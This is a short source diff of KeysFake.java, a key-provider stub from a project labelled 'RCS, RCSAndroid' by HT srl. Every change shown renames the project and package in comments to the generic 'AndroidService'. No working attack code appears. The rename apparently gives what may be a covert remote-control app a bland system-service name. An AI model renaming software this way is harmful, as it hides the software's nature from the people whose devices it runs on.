@@ -1,7 +1,7 @@
 /* *******************************************
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSAndroid
+ * Project      : RCS, AndroidService
  * File         : KeysFake.java
  * Created      : Apr 9, 2011
  * Author		: zeno
@@ -40,7 +40,7 @@ public class KeysFake extends Keys {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getAesKey()
+	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
 	 */
 	@Override
 	public byte[] getAesKey() {
@@ -51,7 +51,7 @@ public class KeysFake extends Keys {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getChallengeKey()
+	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
 	 */
 	@Override
 	public byte[] getChallengeKey() {
@@ -61,7 +61,7 @@ public class KeysFake extends Keys {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getConfKey()
+	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
 	 */
 	@Override
 	public byte[] getConfKey() {
@@ -75,7 +75,7 @@ public class KeysFake extends Keys {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.crypto.Keys#getBuildId()
+	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
 	 */
 	@Override
 	public byte[] getBuildId() {
